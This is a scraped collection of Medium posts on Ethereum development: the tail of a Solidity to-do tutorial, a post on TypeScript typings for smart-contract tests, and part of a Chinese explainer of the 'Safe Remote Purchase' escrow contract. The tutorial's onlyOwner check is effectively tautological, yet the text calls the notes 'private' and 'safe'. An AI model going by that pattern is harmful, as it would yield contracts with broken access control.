if(lastIds[msg.sender] >= maxAmountOfTodos) lastIds[msg.sender] = 0;      else lastIds[msg.sender]++;   }   // Mark a todo as completed   function markTodoAsCompleted(uint256 _todoId) public {      require(_todoId < maxAmountOfTodos);      require(!todos[msg.sender][_todoId].isCompleted);      todos[msg.sender][_todoId].isCompleted = true;   }}Here\u2019s what I just did:I added the function markTodoAsCompleted which will allow us to mark a to-do as completed whenever the user wants. I simply get the specific to-do from the _todoId sent by the user of the application to mark it as completed.You see that I\u2019m using a new global function called require. This is a very important function that allows us to check some conditions before executing that function. In this case I\u2019m saying: \u201cRequire that the to-do id sent is smaller than the maximum number of to-dos\u201d and \u201cRequire that the to-do selected is not completed\u201d.Most of the require statements are used at the top of the function for checking the parameters of the function even though you can use the require function wherever you want. I\u2019m using the exclamation sign\u00a0! in front of the boolean value to negate and invert the condition.If require results true, the function executes. If require results in false, the function execution is stopped, and the user will receive an error. The remaining gas will be refunded to the user.Finally, I set the selected to-do as completed.When a user executes a function from the Smart Contract, he needs to send some amount of gas. The minimum amount of gas required to execute any function inside a Smart Contract is 21000 and can be up to 8 million. It\u2019s just a fee that gets converted to ether that miners receive for processing the transaction, in this case, a function execution in your Smart Contract.In Solidity you can use for and while loops:A for loop in Solidity is limited by the gas that you send to the Smart Contract. It will continue looping until it loops all the items or until it runs out of gas. Because in each iteration it\u2019s consuming gas for processing that code. In essence, this means that your for loops are limited to a specific number of loops, you can\u2019t loop endlessly. Here\u2019s the syntax for a for loop:for(uint256 i = 0; i < myArray.length; i++) {   // Do something with the array}That\u2019s why for and while loops are not recommended in Solidity because you\u2019ll probably run into gas problems.It\u2019s your job to optimize the code and to make sure that the loops are not breaking the gas limits by limiting the arrays like I did in this case.You may have noticed that the function markTodoAsCompleted can be executed by anyone that knows the address of this Smart Contract once it\u2019s deployed. By default, all functions are public. This means that anyone that has the contract code can execute and see all the functions.However, we don\u2019t want that. In this case we want to only allow the to-do owner to modify his own notes. That\u2019s the main reason we have an owner parameter in the to-do struct. Luckily, we can do that in Solidity with a very powerful component called modifiers. Let\u2019s see how it will be used in this project:pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;   // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;   // Owner => last todo id   mapping(address => uint256) public lastIds;   modifier onlyOwner(address _owner) {      require(msg.sender == _owner);      _;   }   // Add a todo to the list   function addTodo(bytes32 _content) public {      Todo memory myNote = Todo(lastIds[msg.sender], _content, msg.sender, false, now);      todos[msg.sender][lastIds[msg.sender]] = myNote;      if(lastIds[msg.sender] >= maxAmountOfTodos) lastIds[msg.sender] = 0;      else lastIds[msg.sender]++;   }   // Mark a todo as completed   function markTodoAsCompleted(uint256 _todoId) public onlyOwner(todos[msg.sender][_todoId].owner) {      require(_todoId < maxAmountOfTodos);      require(!todos[msg.sender][_todoId].isCompleted);      todos[msg.sender][_todoId].isCompleted = true;   }}You can see that I created a modifier called onlyOwner. A modifier is like a function that gets execute before the actual function. You first define the modifier, which usually has a require statement inside, then you add the underscore _; which indicates that the code will be inserted below that underscore if you pass the require checks successfully.Finally, you have to add that modifier to the function that you want to be affected. The modifier will be executed before the actual function every time. You have to write it after the name of the function, before the opening curly bracket of the function affected {.Are you still following me? Great.In this case I\u2019m creating the modifier onlyOwner, which receives an address and checks if the user that executed that modifier is the owner that you sent him. Then I added the modifier to the function markTodoAsCompleted to only allow the modification of that note by the owner of it.Yes, it\u2019s a lot of information but you\u2019ll see how powerful the modifiers are. You\u2019ll get used to them pretty quickly as you write Smart Contracts. The structure of a modifier usually is:modifier <name>(<parameters>) {   require(<something>);   _;}You can also add parameters to the modifiers. Otherwise, you have to remove the brackets (<parameters>).Now the function markTodoAsCompleted is only executable by the owner of the note selected by the id. Your private notes are safe now!Here\u2019s what you accomplished so far:You created a contract called TodoLists whose purpose is to create and modify to-do notes.Then you defined the structure of an individual To-do and you created the mapping of all the notes for each user.Then you created a function to add new to-dos to the sender address. Also, you added a function to mark the to-dos as completed.Finally, you\u2019ve restricted the access of the to-dos to only allow modification of the to-dos a user owns with the modifier only owner.Your application is complete. Users can create their own decentralized to-dos using your Smart Contract. Let\u2019s recap what you have learned by doing this project:You know how to understand a specification to extract the information that you need to create your Smart Contract.You know that you have to start a Smart Contract by defining the main variables and components.You know how to create functions in Solidity with return values named or not.You know how to create struct instances using the memory keyword.You know when and how you must use the function require to check for conditions.You know how to create modifiers with or without parameters and you know that you can add as many modifiers as you want to each function.Congratulations. Now you have the basic knowledge of Solidity.I want you to do another project on your own. Look at some simple applications on android that you could replicate with a Smart Contract to make them decentralized. You could even make a game with mappings and structs to keep track of the players and scores.Be creative.The most important thing is that you apply your knowledge with something on your own. Try to complete it in a day or two. You\u2019ll learn a lot and you\u2019ll have something to show to people that will want to hire you.I encourage you to write an article on medium about your own project. It will grow your personal brand which will give you lots of employment opportunities and contract work related to Ethereum.Do let me know what you created. Send me an email to merunasgrincalaitis@gmail.com saying \u201cHi\u201d with your experience learning Solidity. I\u2019d love to hear from you.Here are some specifications that you can use to create a Smart Contract for practicing your skills:\u201cA decentralized recipe application. People post their best food recipes and external users rate the them. They can also indicate that they made the recipe for showing the most popular recipes. The creator of the recipe can write up to 1000 words and add images with external links. Each recipe has a title and the estimated time to make it. Recipes can have tags for improving the search experience.\u201d\u201cA decentralized calendar used by sports people where they indicate what sports did they play each day along with the approximate time dedicated to physical activity. They also rate their day based on the intensity of the sport\u201d\u201cA decentralized social travel platform where users can chat and exchange experiences. When a new user visits a new country, he can get recommendations from locals who earn a virtual token that can be exchanged for ether inside the same contract.\u201dContinue reading once you complete your own project since the next part will go into much detail about the complex parts of Solidity. The basics are essential. Remember to share what you learned. Send me an email or tweet me with your progress.This is the end of the chapter 13 of the book Ethereum Developer: Learn Solidity From Scratch. You can find the book here: https://www.amazon.com/dp/B07BJB1YNQ and it will be free if you have kindle unlimited.Let me know what do you think.", "responses": "5"}, {"title": "How TypeScript Makes Smart Contracts Easier to Test and More\u00a0Robust", "author_name": "John Backus", "link": "https://blog.hellobloom.io/how-typescript-makes-smart-contracts-easier-to-test-and-more-robust-c612a2d99537?source=search_post", "post_date": "Nov 16, 2017", "readtime": "5 min read", "upvotes": "598", "content": "How TypeScript Makes Smart Contracts Easier to Test and More\u00a0RobustJohn BackusBlockedUnblockFollowFollowingNov 16, 2017Integrating with smart contracts can be tough. In particular, solidity doesn\u2019t really have runtime errors with descriptive messages, so a lot of failed transactions just fail with the generic message invalid opcode.If it is painful to write tests, you are probably going to write fewer. Test coverage is an important piece of the puzzle for building robust software. At Bloom, we want to do our best to build reliable contracts so we quickly looked for strategies to reduce this testing pain.Writing tests for smart contracts can be especially tough. In the example gif below, I\u2019m trying to test the buyTokens function and I make a series of mistakes along the way. The test output usually tells me something is wrong, but not much more.The mistakes in this example are:Saying amount: 50 instead of value: 50 to specify how much wei to send in a transactionCalling balanceOf on a sale contract instead of a token contractForgetting to wait for the Promise to resolve when getting the return value from a contract functionSending ether to a non-payable functionThese are all mistakes I\u2019ve made a few times before while writing contract tests and it can take much longer to resolve the issues than it takes in the gif above.We have the technologyThe frustrating thing when writing these javascript tests for our contracts is that all of the type information is sitting right next door in our contracts. In fact, our truffle compile step also puts the very simple contract ABIs in our build folder. For the really simple contract we\u2019re testingpragma solidity ^0.4.15;import \"zeppelin/crowdsale/Crowdsale.sol\";contract SimpleSale is Crowdsale {   function SimpleSale (    uint256 _startTime,    uint256 _endTime,    uint256 _rate,    address _wallet  ) Crowdsale(_startTime, _endTime, _rate, _wallet) {  }}the ABI has a lot of helpful type info:[  {    \"constant\": true,    \"inputs\": [],    \"name\": \"rate\",    \"outputs\": [{ \"name\": \"\", \"type\": \"uint256\" }],    \"payable\": false,    \"type\": \"function\"  },  {    \"constant\": false,    \"inputs\": [{ \"name\": \"beneficiary\", \"type\": \"address\" }],    \"name\": \"buyTokens\",    \"outputs\": [],    \"payable\": true,    \"type\": \"function\"  },  // ...]This is only two of the functions the contract exposes, but for these two we see:The function rate does not take any arguments, it does not accept ether, and it returns a 256 bit integerThe function buyTokens takes an address as an argument, it doesn\u2019t return anything, and it accepts etherWith a little bit of elbow grease, we can translate this knowledge into TypeScript typings:import * as Web3 from \"web3\";import * as BigNumber from \"bignumber.js\";type Address = string;type TransactionOptions = Partial<Transaction>;type PayableTransactionOptions = Partial<PayableTransaction>;type UInt = number | BigNumber.BigNumber;interface Transaction {  hash: string;  nonce: number;  blockHash: string | null;  blockNumber: number | null;  transactionIndex: number | null;  from: Address | ContractInstance;  to: string | null;  gasPrice: UInt;  gas: number;  input: string;}interface PayableTransaction extends Transaction {  value: UInt;}interface ContractInstance {  address: string;  sendTransaction(options?: PayableTransactionOptions): Promise<void>;}export interface SimpleSaleInstance extends ContractInstance {  rate(options?: TransactionOptions): Promise<BigNumber.BigNumber>;  buyTokens(    beneficiary: Address,    options?: PayableTransactionOptions  ): Promise<void>;  // Etc...}This builds on the fantastic web3 typings from the 0x project. Configuring our workspace to use TypeScript typings improves our workflow a lot compared to the gif earlier. Take a look:TypeScript catching\u00a0mistakesIn this example, the TypeScript typings are:Giving me a list of functions I can call on saleTelling me the arguments for buyTokensReminding me that the function returns a promise which I need to wait forCorrecting me when I type amount instead of value for specifying how much ether to sendReminding me to change sale to token for calling balanceOfPointing out that I cannot send ether to balanceOf and therefore I\u2019m not allowed to specify value as an optionPretty big difference! Every mistake I had to figure out after seeing the test fail in the first example was shown to me immediately in my editor. Thanks, TypeScript!Don\u2019t repeat\u00a0yourselfTypings are nice, but it would be pain to update the type annotations every time we update a contract. Luckily, we can generate our type annotations too.Looking back at part of our ABI from before and the corresponding type annotations, we can see what information we need to compile into valid TypeScript source:{  \"constant\": false,  \"inputs\": [{ \"name\": \"beneficiary\", \"type\": \"address\" }],  \"name\": \"buyTokens\",  \"outputs\": [],  \"payable\": true,  \"type\": \"function\"}buyTokens(  beneficiary: Address,  options?: PayableTransactionOptions): Promise<void>;If we write a bit of code to traverse this JSON, we can then just visit each input and match it to a type we define in our generated TypeScript:// Simplified type mappingfunction translateType(type: SolidityType): string {  switch (type) {    case \"string\":      return \"string\";    case \"address\":      return \"Address\";    case \"bool\":      return \"boolean\";    case \"uint256\":      return 'number | BigNumber.BigNumber';    default:      throw `Unexpected case! ${type}`;  }}If we pull out the name of the function and do the same for the outputs (using TypeScript\u2019s tuple types) we can generate each functions source code. Once we generate interfaces for each contract, we can maintain a corresponding declaration file which maps our truffle requires to interfaces:// truffle.d.tsimport { SimpleSaleInstance } from \"./contracts\";declare global {  var artifacts: Artifacts;}interface Artifacts {  require(name: \"SimpleSale\"): Contract<SimpleSaleInstance>;}Now, our type definitions automatically work when we require the contract in our tests:Zero overhead type annotationsMy current solution is pretty rough, but it works. Checkout our sample repo to see how it works with a basic truffle project.Further readingCheckout the web3 typingsLook into Typechain. New project which I haven\u2019t used but I found after writing this postDid you enjoy this post? Follow our blog for future updates.", "responses": "3"}, {"title": "\u7dda\u4e0a\u8cfc\u7269\u5b89\u5168\u6a5f\u5236\u7684 Smart\u00a0Contract", "author_name": "Yuren Ju", "link": "https://medium.com/taipei-ethereum-meetup/%E7%B7%9A%E4%B8%8A%E8%B3%BC%E7%89%A9%E5%AE%89%E5%85%A8%E6%A9%9F%E5%88%B6%E7%9A%84-smart-contract-5ce3e366cb2e?source=search_post", "post_date": "Sep 12, 2017", "readtime": "6 min read", "upvotes": "221", "content": "\u7dda\u4e0a\u8cfc\u7269\u5b89\u5168\u6a5f\u5236\u7684 Smart\u00a0ContractYuren JuBlockedUnblockFollowFollowingSep 12, 2017\u9019\u500b\u6708\u56e0\u70ba\u6b63\u5728\u505a\u4e00\u500b\u77ed\u671f\u7684\u5408\u7d04\u6240\u4ee5\u975e\u5e38\u7684\u5fd9\uff0c\u73fe\u5728\u624d\u53c8\u6709\u7a7a\u56de\u4f86\u770b\u5340\u584a\u93c8\u7684 solidity \u8a9e\u8a00\uff0c\u5c31\u5148\u5f9e\u4e00\u500b\u7c21\u55ae\u7684\u958b\u59cb\u5427\u00a0:D\u672c\u6587\u6703\u76e1\u91cf\u7528\u4e0d\u9700\u8981\u6709\u7a0b\u5f0f\u57fa\u790e\u7684\u65b9\u5f0f\u6558\u8ff0\uff0c\u8b93\u66f4\u591a\u4eba\u53ef\u4ee5\u7406\u89e3\u3002Solidity \u5b98\u7db2\u7684\u6559\u5b78\u5176\u4e2d\u6709\u500b\u4f8b\u5b50\u662f \u201cSafe Remote Purchase\u201d\uff0c\u662f\u7528\u5340\u584a\u93c8\u5be6\u4f5c\u7dda\u4e0a\u8cfc\u7269\u7684\u5b89\u5168\u6a5f\u5236\uff0c\u8b80\u5230\u6642\u89ba\u5f97\u5f88\u6709\u610f\u601d\uff0c\u4ecb\u7d39\u7d66\u5927\u5bb6\u3002\u66f4\u65b0\uff1a\u4e0d\u904e\u8981\u6ce8\u610f\u5230\u9019\u5c31\u662f Solidity \u7a0b\u5f0f\u8a9e\u8a00\u6559\u5b78\u88cf\u6240\u9644\u7684\u7bc4\u4f8b\uff0c\u4e26\u4e0d\u662f\u5be6\u969b\u4e0a\u7dda\u4f7f\u7528\u7684\u3002\u5c31\u50cf\u6bd4\u5982\u6559 PHP \u7684\u66f8\u88e1\u9762\u6559\u5b78\u8981\u5982\u4f55\u64b0\u5beb\u4e00\u500b\u8cfc\u7269\u8eca\u7cfb\u7d71\u4e00\u6a23\uff0c\u8ddd\u96e2\u5be6\u969b\u4e0a\u7dda\u61c9\u7528\u9084\u6709\u6bb5\u8ddd\u96e2\uff0c\u4e0d\u904e\u53ef\u4ee5\u4e86\u89e3\u5176\u4e2d\u7684\u6982\u5ff5\u3002\u4ee5\u524d /\u00a0\u76ee\u524d\u7684\u4ea4\u6613\u65b9\u6cd5\u5728\u6c92\u6709\u7dda\u4e0a\u8cfc\u7269\u7db2\u7ad9\u7684\u6642\u5019\uff0c\u5927\u5bb6\u90fd\u662f\u4e00\u624b\u4ea4\u9322\uff0c\u4e00\u624b\u4ea4\u8ca8\uff0c\u901a\u5e38\u90fd\u4e0d\u6703\u6709\u4ec0\u9ebc\u554f\u984c\u3002\u4e00\u624b\u4ea4\u9322\u4e00\u624b\u4ea4\u8ca8\uff0c\u901a\u5e38\u4e0d\u6703\u6709\u4ec0\u9ebc\u554f\u984c\u3002\u7576\u958b\u59cb\u53ef\u4ee5\u900f\u904e\u7dda\u4e0a\u8cfc\u7269\u5f8c\uff0c\u4e8b\u60c5\u5c31\u6709\u9ede\u4e0d\u4e00\u6a23\u4e86\u3002\u5927\u5bb6\u5728 PChome \u6216 Amazon \u4e0a\u600e\u9ebc\u78ba\u8a8d\u4f60\u6703\u6536\u5230\u6240\u8cfc\u8cb7\u7684\u6771\u897f\u5462\uff1f\u96d6\u7136\u6709\u8ffd\u8e64\u5546\u54c1\u76ee\u524d\u9001\u5230\u54ea\u88e1\u7684\u5de5\u5177\uff0c\u4f46\u662f\u5546\u5bb6\u6703\u4e0d\u6703\u78ba\u5be6\u51fa\u8ca8\u7d66\u4f60\uff0c\u4f9d\u9760\u7684\u662f\u5546\u5bb6\u8207\u5e73\u53f0\u7684\u4fe1\u7528\u8207\u6cd5\u5f8b\u898f\u7bc4\uff0c\u901a\u5e38\u662f\u4f60\u5148\u4ed8\u4e86\u9322\uff08\u6216\u662f\u4f7f\u7528\u4fe1\u7528\u5361\uff09\uff0c\u63a5\u8457\u4f9d\u9760\u5546\u5bb6\u7684\u4fe1\u7528\u8207\u6cd5\u5f8b\u898f\u7bc4\uff0c\u671f\u5f85\u4ed6\u6703\u51fa\u8ca8\u7d66\u4f60\u3002\u5982\u679c\u4ed6\u4e0d\u51fa\u8ca8\u7d66\u4f60\uff0c\u4ed6\u7684\u4fe1\u8b7d\u5c31\u6703\u53d7\u640d\uff0c\u6216\u8005\u5229\u7528\u6253\u5b98\u53f8\u900f\u904e\u6cd5\u5f8b\u61f2\u7f70\u4ed6\u7684\u884c\u70ba\u3002\u900f\u904e\u653f\u5e9c\u6216\u5e73\u53f0\u76e3\u7763\uff0c\u900f\u904e\u5408\u7d04\u6216\u6cd5\u5f8b\u7d04\u675f\u53e6\u5916\u4e00\u500b\u5e38\u7528\u7684\u65b9\u5f0f\u5c31\u662f\u8ca8\u5230\u4ed8\u6b3e\uff0c\u62ff\u5230\u5546\u54c1\u4e4b\u5f8c\u5728\u4ed8\u6b3e\u7d66\u7269\u6d41\u7684\u4eba\u4ee3\u6536\uff0c\u4e26\u4e14\u6700\u5f8c\u4ea4\u4ed8\u7d66\u5546\u5bb6\u3002\u900f\u904e\u7269\u6d41\u4ee3\u6536\u670d\u52d9\uff0c\u7531\u4e2d\u9593\u4eba\u7d93\u624b\u5546\u54c1\u8207\u91d1\u9322\u4e0d\u7ba1\u662f\u90a3\u7a2e\u65b9\u5f0f\uff0c\u4e2d\u9593\u90fd\u9700\u8981\u9760\u5408\u7d04\uff08\u6cd5\u5f8b\uff09\u7684\u7d04\u675f\u6216\u4e2d\u9593\u4eba\uff08\u7269\u6d41\u696d\u8005\u4ee3\u6536\u6216\u662f\u96fb\u5b50\u5546\u52d9\u5e73\u53f0\uff09\u4f86\u78ba\u8a8d\u96d9\u65b9\u6709\u62ff\u5230\u6b3e\u9805\u8207\u8ca8\u54c1\uff0c\u800c\u5176\u5be6\u9760\u5408\u7d04\u7684\u65b9\u5f0f\uff0c\u4e2d\u9593\u4eba\u4e5f\u53ea\u662f\u63db\u6210\u653f\u5e9c\u800c\u5df2\uff0c\u7528\u653f\u5e9c\u6210\u7acb\u7684\u6cd5\u5f8b\u4f86\u7d04\u675f\u9019\u4ef6\u4e8b\u60c5\u3002\u9019\u4e5f\u5c31\u662f\u5982\u679c\u6211\u5011\u770b\u5230\u4e00\u500b\u65b0\u7684\u96fb\u5546\u5e73\u53f0\uff0c\u5982\u679c\u662f\u500b\u964c\u751f\u7684\u54c1\u724c\u751a\u81f3\u7db2\u7ad9\u505a\u5f97\u5f88\u6389\u6f06\u6642\uff0c\u4f60\u53ef\u80fd\u5c31\u6703\u5c0d\u65bc\u4ed6\u7684\u4fe1\u8b7d\u7522\u751f\u61f7\u7591\uff0c\u9032\u800c\u4e0d\u9858\u610f\u4f7f\u7528\u9019\u500b\u5e73\u53f0\u3002\u4f7f\u7528\u5340\u584a\u93c8\u7684\u4ea4\u6613\u65b9\u6cd5\u5982\u679c\u4f7f\u7528\u5340\u584a\u93c8\uff0c\u8981\u600e\u9ebc\u8b93\u9019\u500b\u4ea4\u6613\u5728\u4e0d\u9700\u8981\u4e2d\u9593\u4eba\u7684\u5354\u52a9\u4e0b\u5b8c\u6210\u5462\uff1f\u9019\u5c31\u662f\u5b98\u7db2\u4e0a\u7684 Safe Remote Purchase \u6240\u4ecb\u7d39\u7684\u4e8b\u60c5\u3002\u5340\u584a\u93c8\u4e2d\u7684 Smart Contract (\u667a\u80fd\u5408\u7d04) \u662f\u4e00\u7a2e\u653e\u5728\u5340\u584a\u93c8\u4e0a\u7684\u5408\u7d04\uff0c\u6703\u4f9d\u7167\u5408\u7d04\u7684\u5167\u5bb9\u57f7\u884c\u5404\u7a2e\u5408\u7d04\u4e0a\u6240\u8a18\u8f09\u7684\u689d\u6587\u3002\u5982\u679c\u4f60\u719f\u6089\u8edf\u9ad4\u7a0b\u5f0f\u7684\u8a71\u63db\u7a2e\u65b9\u5f0f\u8b1b\uff1a\u667a\u80fd\u5408\u7d04\u5c31\u662f\u4e00\u6bb5\u5728\u5340\u584a\u93c8\u4e0a\u57f7\u884c\u7684\u7a0b\u5f0f\uff0c\u4efb\u4f55\u7a0b\u5e8f\u90fd\u6703\u4f9d\u7167\u6e90\u78bc\u4e0a\u6240\u64b0\u5beb\u7684\u65b9\u5f0f\u57f7\u884c\u3002\u800c\u667a\u80fd\u5408\u7d04\u900f\u904e\u5340\u584a\u93c8\u7684\u6a5f\u5236\uff0c\u78ba\u8a8d\u5408\u7d04\u7684\u57f7\u884c\u662f\u6c92\u6709\u906d\u5230\u507d\u9020\u7ac4\u6539\u7684\uff0c\u6211\u5011\u9019\u908a\u5c31\u4e0d\u63d0\u8981\u600e\u9ebc\u78ba\u8a8d\u4e0d\u53d7\u5230\u507d\u9020\u7ac4\u6539\uff0c\u90a3\u9700\u8981\u4e00\u9ede\u7bc7\u5e45\u89e3\u91cb\u3002\u65e2\u7136\u667a\u80fd\u5408\u7d04\u53ef\u4ee5\u4f9d\u7167\u5408\u7d04\u4e0a\u6240\u8a18\u8f09\u7684\u689d\u6587\u57f7\u884c\uff0c\u90a3\u9ebc\u76e3\u7763\u9019\u500b\u5408\u7d04\u6703\u78ba\u5be6\u5c65\u884c\u7684\u76e3\u7763\u8005\uff0c\u5c31\u4e0d\u9700\u8981\u662f\u653f\u5e9c\u6216\u662f\u898b\u8b49\u4eba\uff0c\u800c\u662f\u667a\u80fd\u5408\u7d04\u672c\u8eab\u5c31\u53ef\u4ee5\u76e3\u7763\u5408\u7d04\u7684\u5c65\u884c\u3002\u76f4\u63a5\u7531\u667a\u80fd\u5408\u7d04\u672c\u8eab\u76e3\u7763\u5408\u7d04\u7684\u5c65\u884c\uff0c\u4e0d\u9700\u8981\u4e2d\u9593\u4eba\u5982\u653f\u5e9c\u76e3\u7763\u56de\u5230\u6211\u5011\u60f3\u89e3\u6c7a\u7684\u554f\u984c\uff1a\u6211\u5011\u8981\u600e\u9ebc\u78ba\u8a8d\u5546\u5bb6\u6709\u5c07\u5546\u54c1\u7d66\u4f60\uff0c\u800c\u4f7f\u7528\u8005\u6709\u4ed8\u8cbb\u7d66\u5546\u5bb6\uff1f\u56e0\u70ba\u667a\u80fd\u5408\u7d04\u6703\u4f9d\u7167\u689d\u6587\u57f7\u884c\uff0c\u6211\u5011\u5c31\u4e0d\u9700\u8981\u63d0\u4f9b\u8ca8\u5230\u4ed8\u6b3e\u7684\u7269\u6d41\u696d\u8005\u6216\u662f\u653f\u5e9c\u76e3\u7763\u4f86\u89e3\u6c7a\u9019\u500b\u554f\u984c\uff0c\u6211\u5011\u53ef\u4ee5\u8b93\u8cb7\u8ce3\u96d9\u65b9\u90fd\u5148\u7e73\u7d0d\u4e00\u5b9a\u7684\u4fdd\u8b49\u91d1\uff0c\u4e26\u4e14\u5728\u78ba\u8a8d\u4ea4\u6613\u5b8c\u6210\u5f8c\uff0c\u518d\u5c07\u4fdd\u8b49\u91d1\u9000\u56de\u3002\u8ddf\u8ce3\u5bb6\u6536\u4fdd\u8b49\u91d1\u662f\u70ba\u4e86\u9632\u6b62\u4ed6\u6536\u4e86\u9322\u537b\u4e0d\u51fa\u8ca8\u7b49\u539f\u56e0\u8ddf\u8cb7\u5bb6\u6536\u4fdd\u8b49\u91d1\u662f\u70ba\u4e86\u9632\u6b62\u4ed6\u6536\u5230\u8ca8\u537b\u8b0a\u7a31\u4ed6\u6c92\u6536\u5230\u7b49\u539f\u56e0\u4ee5 \u201cSafe Remote Purchase\u201d \u9019\u500b\u7bc4\u4f8b\u4f86\u8aaa\uff0c\u5047\u8a2d\u6709\u4e00\u500b\u5ee0\u5546\u4eca\u5929\u8981\u8ce3\u4e00\u53f0\u7d04 10,000 \u53f0\u5e63\u7684\u624b\u6a5f\uff0c\u9996\u5148\u8ce3\u5bb6\u8981\u5148\u5efa\u7acb\u4e00\u500b\u667a\u80fd\u5408\u7d04\uff0c\u5728\u5efa\u7acb\u5408\u7d04\u7684\u540c\u6642\u8ce3\u5bb6\u9700\u8981\u5148\u7e73\u7d0d 20,000 \u5143\u7684\u4fdd\u8b49\u91d1\uff0c\u9019\u500b\u4fdd\u8b49\u91d1\u5982\u679c\u4ea4\u6613\u6c92\u6709\u5c65\u884c\u6216\u6c92\u6709\u4eba\u8cfc\u8cb7\u6642\u53ef\u4ee5\u53d6\u6d88\uff0c\u800c\u8ce3\u5bb6\u53ef\u4ee5\u62ff\u56de\u6240\u6709\u4fdd\u8b49\u91d1\u3002\u6b64\u6642\u82e5\u6709\u4e00\u500b\u8cb7\u5bb6\u60f3\u8981\u8cb7\u9019\u652f\u624b\u6a5f\uff0c\u4ed6\u53ef\u4ee5\u900f\u904e\u667a\u80fd\u5408\u7d04\u300c\u4ed8\u6b3e\u300d\uff0c\u4f46\u8ddf\u4e00\u822c\u4ea4\u6613\u4e0d\u540c\u7684\u5730\u65b9\uff0c\u5728\u65bc\u8cb7\u5bb6\u4e5f\u9700\u8981\u4ed8\u51fa\u984d\u5916\u7684\u4fdd\u8b49\u91d1\uff0c\u5728\u9019\u500b\u4f8b\u5b50\u4ed6\u4e5f\u8981\u4ed8\u51fa 20,000 \u7684\u91d1\u984d\uff0c\u4e00\u534a\u662f\u8cfc\u8cb7\u624b\u6a5f\u7684\u8cbb\u7528\uff0c\u53e6\u4e00\u534a\u662f\u4fdd\u8b49\u91d1\u3002\u6b64\u6642\uff0c\u9019\u500b\u667a\u80fd\u5408\u7d04\u4e2d\u5df2\u7d93\u6709\u4e86 40,000 \u5143\u7684\u91d1\u984d\u3002\u63a5\u4e0b\u4f86\uff0c\u8ce3\u5bb6\u6536\u5230\u8a02\u55ae\u5f8c\u5c31\u53ef\u4ee5\u5c07\u6b64\u624b\u6a5f\u51fa\u8ca8\u7d66\u8cb7\u5bb6\u3002\u7576\u8cb7\u5bb6\u6536\u5230\u624b\u6a5f\u6642\uff0c\u4ed6\u53ef\u4ee5\u5728\u667a\u80fd\u5408\u7d04\u4e0a\u8a3b\u8a18\u300c\u5df2\u78ba\u8a8d\u6536\u5230\u7269\u54c1\u300d\u3002\u6b64\u6642\u667a\u80fd\u5408\u7d04\u78ba\u8a8d\u4e86\u6574\u500b\u4ea4\u6613\u5df2\u7d93\u5b8c\u6210\uff0c\u6703\u9000\u7d66\u8cb7\u5bb6 10,000 \u5143\u7684\u4fdd\u8b49\u91d1\uff08\u4ed6\u539f\u672c\u7e73\u4e86 20,000 \u5143\uff0c\u4e00\u534a\u662f\u8cb7\u624b\u6a5f\u7684\u8cbb\u7528\uff0c\u53e6\u5916\u4e00\u534a\u662f\u4fdd\u8b49\u91d1\uff09\uff0c\u800c\u8ce3\u5bb6\u6b64\u6642\u5247\u6703\u6536\u5230 30,000 \u7684\u6b3e\u9805\uff0c\u5176\u4e2d 20,000 \u5143\u662f\u4fdd\u8b49\u91d1\uff0c10,000 \u5143\u662f\u552e\u51fa\u624b\u6a5f\u7684\u6b3e\u9805\u3002\u6700\u5f8c\u667a\u80fd\u5408\u7d04\u5e95\u4e0b\u4e0d\u6703\u6709\u4efb\u4f55\u7d50\u9918\u6b3e\u9805\u3002\u4e0a\u8ff0\u7684\u6240\u6709\u52d5\u4f5c\u90fd\u662f\u7531\u667a\u80fd\u5408\u7d04\u4f9d\u7167\u5408\u7d04\u7684\u5167\u5bb9\u57f7\u884c\uff0c\u6240\u4ee5\u4e0d\u6703\u6709\u4e2d\u9593\u4eba\uff0c\u7576\u7136\u4e5f\u4e0d\u6703\u6709\u7121\u6cd5\u4fe1\u4efb\u4e2d\u9593\u4eba\u7684\u554f\u984c\u3002\u5728\u9019\u6a23\u7684\u667a\u80fd\u5408\u7d04\u4e0b\uff0c\u8cb7\u5bb6\u8207\u8ce3\u5bb6\u90fd\u4e0d\u6703\u8f15\u6613\u7684\u4e0d\u9001\u51fa\u5546\u54c1\u6216\u662f\u4e0d\u78ba\u8a8d\u6536\u5230\u5546\u54c1\uff0c\u56e0\u70ba\u96d9\u65b9\u90fd\u653e\u4e86\u4e00\u5b9a\u50f9\u503c\u7684\u4fdd\u8b49\u91d1\u5728\u667a\u80fd\u5408\u7d04\u4e2d\uff0c\u53ea\u6709\u96d9\u65b9\u90fd\u5c65\u884c\u4e86\u8a72\u5c65\u884c\u7684\u689d\u6587\u5f8c\u624d\u6703\u6536\u5230\u9000\u6b3e\uff0c\u800c\u9019\u6a23\u7684\u904e\u7a0b\u4e2d\u5c31\u4e0d\u9700\u8981\u6709\u76e3\u7763\u8005\u4f86\u76e3\u7763\u5408\u7d04\u662f\u5426\u9032\u884c\uff0c\u56e0\u70ba\u96d9\u65b9\u5728\u6c92\u6709\u9054\u6210\u5408\u7d04\u6642\u6b0a\u76ca\u90fd\u6703\u53d7\u640d\uff0c\u6240\u4ee5\u90fd\u6703\u5118\u91cf\u9054\u6210\u5408\u7d04\uff0c\u7576\u7136\u5be6\u969b\u7684\u4ea4\u6613\u4e0d\u6703\u662f\u9019\u9ebc\u7c21\u55ae\uff0c\u53ef\u80fd\u6703\u6709\u5f88\u591a\u9000\u6b3e\u689d\u4ef6\uff0c\u4e0d\u904e\u5f9e\u9019\u500b\u4f8b\u5b50\u4e5f\u53ef\u4ee5\u7aba\u898b\u5340\u584a\u93c8\u5728\u9019\u6a23\u7684\u5834\u666f\u6709\u4ec0\u9ebc\u61c9\u7528\u3002\u56de\u982d\u4f86\u770b\uff0c\u5176\u5be6\u9019\u6a23\u7684\u6846\u67b6\u4e5f\u53ef\u4ee5\u7528\u4efb\u4f55\u516c\u53f8\u63d0\u4f9b\u7684\u670d\u52d9\u9054\u6210\uff0c\u6bd4\u5982\u8aaa\u6709\u516c\u53f8\u63d0\u4f9b\u9019\u6a23\u4fdd\u8b49\u91d1\u67b6\u69cb\u7684\u670d\u52d9\uff0c\u4e26\u4e14\u8ca0\u8cac\u7269\u6d41\uff0c\u4e5f\u53ef\u4ee5\u9054\u6210\u540c\u6a23\u7684\u76ee\u7684\u5c0d\u5427\uff1f\u4f46\u662f\u5982\u679c\u662f\u9019\u6a23\uff0c\u554f\u984c\u53c8\u56de\u5230\u4e86\u539f\u9ede\uff1a\u4f60\u8981\u600e\u9ebc\u78ba\u8a8d\u9019\u9593\u516c\u53f8\u